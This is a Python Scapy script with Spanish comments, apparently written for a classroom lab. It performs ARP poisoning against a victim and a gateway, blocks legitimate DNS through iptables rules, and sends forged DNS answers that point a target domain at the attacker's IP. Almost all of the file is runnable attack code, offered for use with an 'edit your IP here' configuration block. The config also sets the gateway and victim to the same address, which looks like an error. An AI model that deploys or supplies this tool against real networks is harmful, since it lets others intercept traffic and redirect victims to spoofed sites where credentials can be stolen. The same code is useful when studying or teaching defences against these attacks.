#!/usr/bin/env python3
"""
=======================================================
  DNS Spoofing via ARP Poisoning 
=======================================================
"""

from scapy.all import *
import threading
import time
import sys
import os

# ╔══════════════════════════════════════════╗
# ║         CONFIGURACIÓN  (EDITAR)          ║
# ╚══════════════════════════════════════════╝
ATTACKER_IP   = "192.168.10.12"   # ← PON TU IP AQUÍ
VICTIM_IP     = "192.168.10.13"
GATEWAY_IP    = "192.168.10.13"
TARGET_DOMAIN = "itla.edu.do"
IFACE         = "ens3"            
# ════════════════════════════════════════════

running = True


# ─────────────────────────────────────────
#  UTILIDADES
# ─────────────────────────────────────────

def banner():
    print("""
  ██████╗ ███╗   ██╗███████╗    ███████╗██████╗  ██████╗  ██████╗ ███████╗
  ██╔══██╗████╗  ██║██╔════╝    ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝
  ██║  ██║██╔██╗ ██║███████╗    ███████╗██████╔╝██║   ██║██║   ██║█████╗
  ██║  ██║██║╚██╗██║╚════██║    ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝
  ██████╔╝██║ ╚████║███████║    ███████║██║     ╚██████╔╝╚██████╔╝██║
  ╚═════╝ ╚═╝  ╚═══╝╚══════╝    ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝
  DNS Spoofing | ARP Poisoning | Scapy 2.4.5
""")


def check_root():
    if os.geteuid() != 0:
        print("[✗] Debes ejecutar como root: sudo python3 dns_spoof.py")
        sys.exit(1)


def check_config():
    if "XX" in ATTACKER_IP:
        print("[✗] Cambia ATTACKER_IP en el script por tu IP real.")
        print("    Usa: ip addr show")
        sys.exit(1)


def get_mac(ip):
    """Resuelve MAC via ARP"""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        iface=IFACE, timeout=3, verbose=False, retry=2
    )
    if not ans:
        print(f"[✗] No se pudo resolver MAC de {ip}. ¿Está activo el host?")
        sys.exit(1)
    return ans[0][1].hwsrc


# ─────────────────────────────────────────
#  ARP POISONING
# ─────────────────────────────────────────

def arp_spoof(victim_mac, gateway_mac):
    """
    Envenena ARP de forma continua:
      - Le dice a la víctima   que la MAC del gateway somos nosotros
      - Le dice al gateway que la MAC de la víctima somos nosotros
    """
    # Paquetes pre-construidos para eficiencia
    pkt_victim  = ARP(op=2, pdst=VICTIM_IP,  hwdst=victim_mac,  psrc=GATEWAY_IP)
    pkt_gateway = ARP(op=2, pdst=GATEWAY_IP, hwdst=gateway_mac, psrc=VICTIM_IP)

    print("[ARP] Envenenamiento activo (cada 1.5s)...")
    while running:
        send(pkt_victim,  verbose=False, iface=IFACE)
        send(pkt_gateway, verbose=False, iface=IFACE)
        time.sleep(1.5)


def restore_arp(victim_mac, gateway_mac):
    """Restaura las tablas ARP originales al salir"""
    print("\n[ARP] Restaurando tablas ARP originales...")
    send(ARP(op=2,
             pdst=VICTIM_IP,  hwdst=victim_mac,
             psrc=GATEWAY_IP, hwsrc=gateway_mac),
         count=5, verbose=False, iface=IFACE)
    send(ARP(op=2,
             pdst=GATEWAY_IP, hwdst=gateway_mac,
             psrc=VICTIM_IP,  hwsrc=victim_mac),
         count=5, verbose=False, iface=IFACE)
    print("[ARP] ✓ Restaurado.")


# ─────────────────────────────────────────
#  DNS SPOOFING
# ─────────────────────────────────────────

def handle_dns(pkt):
    """
    Intercepta queries DNS de la víctima.
    Si es para TARGET_DOMAIN, responde con ATTACKER_IP.
    """
    # Filtrar: solo queries DNS (qr=0) con campo de pregunta
    if not (pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt[DNS].qd):
        return

    try:
        qname = pkt[DNS].qd.qname.decode('utf-8').rstrip('.')
    except Exception:
        return

    # ¿Es el dominio objetivo?
    if TARGET_DOMAIN not in qname:
        return

    # Construir respuesta DNS falsa
    spoofed_pkt = (
        IP(src=pkt[IP].dst, dst=pkt[IP].src) /
        UDP(sport=53, dport=pkt[UDP].sport) /
        DNS(
            id      = pkt[DNS].id,
            qr      = 1,            # Respuesta
            aa      = 1,            # Authoritative
            rd      = pkt[DNS].rd,
            ra      = 1,            # Recursion Available
            qdcount = 1,
            ancount = 1,
            qd      = pkt[DNS].qd,
            an      = DNSRR(
                rrname = pkt[DNS].qd.qname,
                type   = "A",
                ttl    = 300,
                rdata  = ATTACKER_IP
            )
        )
    )

    send(spoofed_pkt, verbose=False, iface=IFACE)
    print(f"[DNS] ✓ SPOOFED  {qname}  →  {ATTACKER_IP}  (cliente: {pkt[IP].src})")


# ─────────────────────────────────────────
#  IPTABLES: bloquear DNS real
# ─────────────────────────────────────────

def block_real_dns():
    """
    Bloquea el forwarding de paquetes DNS reales para que
    el servidor DNS legítimo nunca responda y ganemos la 'carrera'.
    """
    os.system("iptables -A FORWARD -p udp --dport 53 -j DROP")
    os.system("iptables -A FORWARD -p tcp --dport 53 -j DROP")
    print("[iptables] DNS real bloqueado (FORWARD DROP udp/tcp 53)")


def unblock_real_dns():
    os.system("iptables -D FORWARD -p udp --dport 53 -j DROP 2>/dev/null")
    os.system("iptables -D FORWARD -p tcp --dport 53 -j DROP 2>/dev/null")
    print("[iptables] ✓ Reglas DNS eliminadas.")


# ─────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────

def main():
    global running

    banner()
    check_root()
    check_config()

    print(f"[*] Configuración:")
    print(f"    Atacante : {ATTACKER_IP}")
    print(f"    Víctima  : {VICTIM_IP}")
    print(f"    Gateway  : {GATEWAY_IP}")
    print(f"    Dominio  : {TARGET_DOMAIN}")
    print(f"    Interfaz : {IFACE}\n")

    # 1. Resolver MACs
    print("[*] Resolviendo MACs via ARP...")
    victim_mac  = get_mac(VICTIM_IP)
    gateway_mac = get_mac(GATEWAY_IP)
    print(f"    {VICTIM_IP}  →  {victim_mac}")
    print(f"    {GATEWAY_IP} →  {gateway_mac}\n")

    # 2. Habilitar IP forwarding (tráfico no-DNS pasa normal)
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP forwarding habilitado\n")

    # 3. Bloquear forwarding de DNS real
    block_real_dns()
    print()

    # 4. ARP Poisoning en hilo separado
    arp_thread = threading.Thread(
        target=arp_spoof,
        args=(victim_mac, gateway_mac),
        daemon=True
    )
    arp_thread.start()

    # 5. Sniff + DNS Spoof
    print(f"[*] Esperando queries DNS para '{TARGET_DOMAIN}'...")
    print("[*] Ctrl+C para detener\n")

    try:
        sniff(
            iface=IFACE,
            filter=f"udp port 53 and src host {VICTIM_IP}",
            prn=handle_dns,
            store=False
        )
    except KeyboardInterrupt:
        print("\n[*] Deteniendo ataque...")
    finally:
        running = False
        restore_arp(victim_mac, gateway_mac)
        unblock_real_dns()
        print("[*] ¡Limpieza completa! Hasta la próxima.")


if __name__ == "__main__":
    main()